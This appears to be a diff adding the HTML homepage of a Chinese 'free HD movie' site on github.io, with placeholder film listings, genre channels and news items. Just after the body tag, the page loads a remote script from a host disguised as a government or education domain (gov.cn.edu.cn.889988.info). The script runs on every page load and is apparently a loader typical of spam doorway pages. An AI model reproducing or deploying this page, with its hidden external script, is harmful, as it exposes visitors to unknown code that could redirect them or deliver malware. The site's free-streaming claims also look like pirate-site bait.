@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="乐乐电影网,乐乐电影网在线观看,乐乐电影网高清免费,leledianyingwang-zh.github.io">
+<meta name="description" content="乐乐电影网(leledianyingwang-zh.github.io)——轻松看电影、快乐每一天！海量正版高清影视资源在线观看，院线新片、经典老片、热播剧集应有尽有，免费流畅、每日更新。">
+<title>乐乐电影网 - 轻松看电影 快乐每一天 | leledianyingwang-zh.github.io</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --yellow:#ffb800;--deep:#ff6d00;--cream:#fff8ec;--paper:#fffdf8;
+  --txt:#2b2118;--muted:#7a6f63;--line:#f0e2cc;--red:#ff4d3d;
+}
+html{scroll-behavior:smooth;}
+body{font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif;background:var(--cream);color:var(--txt);line-height:1.8;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1140px;margin:0 auto;padding:0 22px;}
+ul{list-style:none;}
+
+/* header */
+.head{background:var(--paper);border-bottom:3px solid var(--yellow);position:sticky;top:0;z-index:50;}
+.head-in{display:flex;align-items:center;justify-content:space-between;padding:16px 0;gap:20px;}
+.logo{display:flex;align-items:center;gap:12px;}
+.logo .ball{width:44px;height:44px;border-radius:50%;background:var(--yellow);display:flex;align-items:center;justify-content:center;font-size:24px;box-shadow:0 4px 0 var(--deep);}
+.logo h1{font-size:22px;font-weight:900;letter-spacing:-.5px;}
+.logo h1 em{font-style:normal;color:var(--deep);}
+.logo p{font-size:10px;color:var(--muted);letter-spacing:1px;}
+.nav{display:flex;gap:4px;}
+.nav a{padding:8px 16px;border-radius:22px;font-size:14px;font-weight:700;color:var(--muted);transition:.2s;}
+.nav a:hover{background:var(--yellow);color:#fff;}
+.head-r{display:flex;align-items:center;gap:10px;}
+.head-r .day{background:var(--cream);border:1px solid var(--line);border-radius:20px;padding:6px 14px;font-size:13px;color:var(--muted);}
+.head-r .day b{color:var(--deep);}
+.burger{display:none;background:var(--yellow);border:none;width:40px;height:40px;border-radius:10px;font-size:20px;cursor:pointer;}
+
+/* hero */
+.hero{background:linear-gradient(135deg,#ffb800,#ff8a00);padding:70px 0 0;overflow:hidden;position:relative;}
+.hero::before{content:"🎬";position:absolute;font-size:200px;right:-20px;bottom:-40px;opacity:.12;}
+.hero-in{display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center;position:relative;}
+.hero .tag{display:inline-block;background:#fff;color:var(--deep);font-size:12px;font-weight:800;padding:6px 16px;border-radius:20px;margin-bottom:18px;box-shadow:0 3px 10px rgba(0,0,0,.08);}
+.hero h2{font-size:50px;font-weight:900;line-height:1.15;color:#3a2a10;}
+.hero h2 span{background:#fff;padding:0 12px;border-radius:10px;box-shadow:0 4px 0 var(--deep);}
+.hero > .hero-in > p{font-size:17px;color:#5a421c;margin:20px 0 28px;max-width:470px;font-weight:500;}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap;}
+.btn{background:#3a2a10;color:#fff;padding:14px 34px;border-radius:30px;font-weight:800;font-size:15px;border:none;cursor:pointer;box-shadow:0 5px 0 #1c1408;}
+.btn:hover{transform:translateY(2px);box-shadow:0 3px 0 #1c1408;}
+.btn.line{background:none;color:#3a2a10;box-shadow:0 0 0 2px #3a2a10 inset;}
+.btn.line:hover{background:#3a2a10;color:#fff;box-shadow:0 3px 0 #1c1408;}
+/* hero visual */
+.montage{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.mo{background:#fff;border-radius:18px;padding:16px;text-align:center;box-shadow:0 10px 26px rgba(0,0,0,.12);}
+.mo .face{font-size:42px;margin-bottom:8px;}
+.mo h5{font-size:15px;font-weight:900;}
+.mo p{font-size:12px;color:var(--muted);}
+
+/* strip */
+.strip{background:#fff;margin-top:-30px;border-radius:24px 24px 0 0;padding:34px 0 0;}
+.strip-in{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;}
+.st{text-align:center;}
+.st b{font-size:26px;font-weight:900;color:var(--deep);}
+.st span{font-size:13px;color:var(--muted);}
+
+/* section */
+section{padding:56px 0;}
+.sec-t{text-align:center;margin-bottom:38px;}
+.sec-t .k{color:var(--deep);font-size:12px;font-weight:800;letter-spacing:2px;}
+.sec-t h3{font-size:30px;font-weight:900;margin:6px 0;}
+.sec-t p{color:var(--muted);font-size:14px;}
+.more-btn{text-align:center;margin-top:34px;}
+.more-btn a{display:inline-block;background:var(--yellow);color:#3a2a10;font-weight:800;padding:12px 34px;border-radius:26px;}
+.more-btn a:hover{background:var(--deep);color:#fff;}
+
+/* film cards */
+.row{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+.film{background:#fff;border:1px solid var(--line);border-radius:20px;overflow:hidden;transition:.3s;}
+.film:hover{transform:translateY(-8px);box-shadow:0 20px 40px rgba(255,109,0,.2);border-color:var(--yellow);}
+.film .thumb{height:200px;display:flex;align-items:center;justify-content:center;font-size:64px;position:relative;}
+.film .star{position:absolute;top:12px;right:12px;background:#fff;border-radius:50%;width:38px;height:38px;display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 3px 8px rgba(0,0,0,.12);}
+.film .info{padding:14px 18px;}
+.film .info h4{font-size:16px;font-weight:900;}
+.film .info .meta{font-size:12px;color:var(--muted);margin:4px 0 10px;}
+.film .info .pill{display:inline-block;background:var(--cream);color:var(--deep);font-size:11px;font-weight:700;padding:3px 10px;border-radius:12px;}
+
+/* channel */
+.ch{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.ch-box{background:#fff;border:2px dashed var(--line);border-radius:20px;padding:26px 24px;text-align:center;transition:.3s;}
+.ch-box:hover{border-color:var(--yellow);background:var(--yellow);}
+.ch-box:hover h4,.ch-box:hover p{color:#3a2a10;}
+.ch-box .e{font-size:38px;margin-bottom:10px;display:block;}
+.ch-box h4{font-size:18px;font-weight:900;}
+.ch-box p{font-size:13px;color:var(--muted);}
+
+/* news */
+.n-list{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
+.n-item{background:#fff;border:1px solid var(--line);border-left:5px solid var(--yellow);border-radius:14px;padding:22px 24px;transition:.3s;}
+.n-item:hover{border-left-color:var(--deep);box-shadow:0 8px 24px rgba(0,0,0,.06);}
+.n-item .d{font-size:12px;color:var(--deep);font-weight:800;}
+.n-item h4{font-size:18px;margin:6px 0 8px;font-weight:900;line-height:1.5;}
+.n-item p{font-size:14px;color:var(--muted);}
+
+/* quote */
+.quote{background:var(--deep);border-radius:28px;padding:46px;text-align:center;color:#fff;}
+.quote h3{font-size:26px;font-weight:900;margin-bottom:14px;}
+.quote p{font-size:15px;opacity:.9;max-width:700px;margin:0 auto 24px;}
+.quote .btn{background:#fff;color:var(--deep);box-shadow:none;}
+.quote .btn:hover{background:var(--yellow);color:#fff;}
+
+/* footer */
+.foot{background:#3a2a10;color:#e8dcce;margin-top:56px;padding:50px 0 24px;}
+.f-in{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px;margin-bottom:30px;}
+.f-in h5{color:#fff;font-size:15px;margin-bottom:14px;}
+.f-in li{margin-bottom:9px;}
+.f-in a{color:#c4b6a6;font-size:14px;}
+.f-in a:hover{color:var(--yellow);}
+.f-in .about p{font-size:14px;color:#c4b6a6;margin-top:10px;max-width:320px;}
+.copy{text-align:center;font-size:12px;color:#a08e7c;border-top:1px solid #5a421c;padding-top:22px;}
+@media(max-width:960px){
+  .hero-in,.n-list{grid-template-columns:1fr;}
+  .row{grid-template-columns:repeat(2,1fr);}
+  .ch{grid-template-columns:1fr 1fr;}
+  .strip-in{grid-template-columns:1fr 1fr;}
+  .hero h2{font-size:36px;}
+  .f-in{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:640px){
+  section{padding:42px 0;}
+  .head-r .day{display:none;}
+  .nav{display:none;}
+  .burger{display:block;}
+  .montage{grid-template-columns:1fr;}
+  .hero h2{font-size:30px;}
+  .row,.ch{grid-template-columns:1fr 1fr;}
+  .strip-in{grid-template-columns:1fr 1fr;}
+  .f-in{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="head">
+  <div class="wrap head-in">
+    <div class="logo">
+      <div class="ball">🎞️</div>
+      <div><h1>乐乐<em>电影网</em></h1><p>LELE DIANYING WANG</p></div>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#">首页</a>
+      <a href="#film">影片大厅</a>
+      <a href="#ch">影片频道</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于乐乐</a>
+    </nav>
+    <div class="head-r">
+      <span class="day">📅 今日更新 <b>36</b> 部</span>
+      <button class="burger" onclick="document.getElementById('nav').style.display=(getComputedStyle(document.getElementById('nav')).display==='flex'?'none':'flex')">☰</button>
+    </div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="wrap hero-in">
+    <div>
+      <span class="tag">🍿 乐乐电影网 · 轻松看电影 快乐每一天</span>
+      <h2>好电影，<br><span>乐乐</span>陪你慢慢看</h2>
+      <p>乐乐电影网（https://leledianyingwang-zh.github.io）为你搜罗全网高清好片，院线新片、经典老片、高分冷门一网打尽，免费在线观看，打开即看，每天都有新惊喜。</p>
+      <div class="hero-cta">
+        <button class="btn" onclick="location.href='#'">免费看电影</button>
+        <a class="btn line" href="#film">逛影片大厅 ›</a>
+      </div>
+    </div>
+    <div class="montage">
+      <div class="mo"><div class="face">🎬</div><h5>院线新片</h5><p>第一时间上线</p></div>
+      <div class="mo"><div class="face">⭐</div><h5>高分精选</h5><p>口碑有保障</p></div>
+      <div class="mo"><div class="face">🏠</div><h5>宅家必备</h5><p>长假片单</p></div>
+      <div class="mo"><div class="face">👨‍👩‍👧</div><h5>合家欢</h5><p>亲子同乐</p></div>
+    </div>
+  </div>
+</div>
+
+<div class="strip">
+  <div class="wrap">
+    <div class="strip-in">
+      <div class="st"><b>10万+</b><span>在线影片</span></div>
+      <div class="st"><b>1080P</b><span>高清画质</span></div>
+      <div class="st"><b>0元</b><span>永久免费</span></div>
+      <div class="st"><b>24h</b><span>每日更新</span></div>
+    </div>
+  </div>
+</div>
+
+<section id="film">
+  <div class="wrap">
+    <div class="sec-t"><div class="k">FILM HALL</div><h3>影片大厅</h3><p>乐乐电影网为你精选当下最值得一看的好片</p></div>
+    <div class="row">
+      <div class="film"><div class="thumb">🚀<div class="star">❤️</div></div><div class="info"><h4>星际快递员</h4><div class="meta">2026 · 科幻冒险 · 135min</div><span class="pill">🔥 热映中</span></div></div>
+      <div class="film"><div class="thumb">🌻<div class="star">❤️</div></div><div class="info"><h4>夏日向日葵</h4><div class="meta">2026 · 青春爱情 · 108min</div><span class="pill">⭐ 口碑之作</span></div></div>
+      <div class="film"><div class="thumb">🐉<div class="star">❤️</div></div><div class="info"><h4>龙渊记</h4><div class="meta">2026 · 古装动作 · 142min</div><span class="pill">💥 视效大片</span></div></div>
+      <div class="film"><div class="thumb">🕵️<div class="star">❤️</div></div><div class="info"><h4>雨夜谜案</h4><div class="meta">2026 · 悬疑犯罪 · 119min</div><span class="pill">🧩 烧脑</span></div></div>
+      <div class="film"><div class="thumb">🎤<div class="star">❤️</div></div><div class="info"><h4>最后一次巡演</h4><div class="meta">2026 · 音乐剧情 · 126min</div><span class="pill">🎵 感人</span></div></div>
+      <div class="film"><div class="thumb">🐠<div class="star">❤️</div></div><div class="info"><h4>深海来信</h4><div class="meta">2026 · 动画奇幻 · 96min</div><span class="pill">🎨 合家欢</span></div></div>
+      <div class="film"><div class="thumb">🥊<div class="star">❤️</div></div><div class="info"><h4>拳力以赴</h4><div class="meta">2026 · 运动励志 · 130min</div><span class="pill">💪 热血</span></div></div>
+      <div class="film"><div class="thumb">🏰<div class="star">❤️</div></div><div class="info"><h4>云上城堡</h4><div class="meta">2026 · 奇幻冒险 · 138min</div><span class="pill">✨ 必看</span></div></div>
+    </div>
+    <div class="more-btn"><a href="#">查看完整片库 →</a></div>
+  </div>
+</section>
+
+<section id="ch" style="background:#fff;">
+  <div class="wrap">
+    <div class="sec-t"><div class="k">CHANNEL</div><h3>影片频道</h3><p>按类型挑选，找片不再眼花缭乱</p></div>
+    <div class="ch">
+      <div class="ch-box"><span class="e">💥</span><h4>动作冒险</h4><p>硬核对决，肾上腺素飙升</p></div>
+      <div class="ch-box"><span class="e">😄</span><h4>喜剧搞笑</h4><p>轻松解压，笑到停不下来</p></div>
+      <div class="ch-box"><span class="e">💘</span><h4>爱情文艺</h4><p>温柔治愈，陪你心动</p></div>
+      <div class="ch-box"><span class="e">👽</span><h4>科幻奇幻</h4><p>脑洞大开，视效震撼</p></div>
+      <div class="ch-box"><span class="e">🧩</span><h4>悬疑惊悚</h4><p>层层反转，考验脑力</p></div>
+      <div class="ch-box"><span class="e">🎨</span><h4>动画亲子</h4><p>大人小孩都能看</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="wrap">
+    <div class="sec-t"><div class="k">NEWS</div><h3>影视资讯</h3><p>乐乐电影网整理最新行业动态与观影指南</p></div>
+    <div class="n-list">
+      <div class="n-item"><div class="d">2026 · 09 · 30</div><h4>《星际快递员》票房破50亿，成今年首部达此成绩</h4><p>从点映口碑到全面引爆，看这部科幻大片如何打动观众。</p></div>
+      <div class="n-item"><div class="d">2026 · 09 · 28</div><h4>国庆宅家片单：8部治愈系电影陪你过节</h4><p>不想出门人挤人？这份精选片单节奏舒缓、画面治愈。</p></div>
+      <div class="n-item"><div class="d">2026 · 09 · 26</div><h4>秋日观影指南：适合一个人慢慢看的5部文艺片</h4><p>气温渐凉，用一部好电影温暖自己的夜晚。</p></div>
+      <div class="n-item"><div class="d">2026 · 09 · 24</div><h4>本周新片速递：院线上映的6部值得关注影片</h4><p>每周更新，提前锁定院线看点，不再错过好片。</p></div>
+    </div>
+    <div class="more-btn"><a href="#">浏览全部资讯 →</a></div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="quote">
+      <h3>关于乐乐电影网</h3>
+      <p>乐乐电影网（https://leledianyingwang-zh.github.io）名字里就带着"快乐"二字。我们坚持做一件事：让每一个人都能轻松、免费地在线观看喜欢的电影。好电影值得被更多人看见，这就是乐乐存在的原因。</p>
+      <a class="btn" href="#">开始快乐观影 →</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="f-in">
+      <div class="about">
+        <div class="logo"><div class="ball">🎞️</div><h1 style="color:#fff;">乐乐<em style="color:var(--yellow);">电影网</em></h1></div>
+        <p>乐乐电影网(leledianyingwang-zh.github.io)——轻松看电影，快乐每一天。免费高清影视在线观看，让好电影触手可及。</p>
+      </div>
+      <div><h5>影片频道</h5><ul><li><a href="#">动作电影</a></li><li><a href="#">喜剧电影</a></li><li><a href="#">爱情电影</a></li><li><a href="#">科幻电影</a></li></ul></div>
+      <div><h5>观影服务</h5><ul><li><a href="#">新片速递</a></li><li><a href="#">高分榜单</a></li><li><a href="#">观影指南</a></li><li><a href="#">常见问题</a></li></ul></div>
+      <div><h5>关于我们</h5><ul><li><a href="#">关于乐乐</a></li><li><a href="#">合作投稿</a></li><li><a href="#">隐私声明</a></li><li><a href="#">联系我们</a></li></ul></div>
+    </div>
+    <div class="copy">© 2026 乐乐电影网 · 网站网址：https://leledianyingwang-zh.github.io · 本站内容仅供影视信息交流与分享，版权归原作者及发行方所有</div>
+  </div>
+</footer>
+
+</body>
+</html>
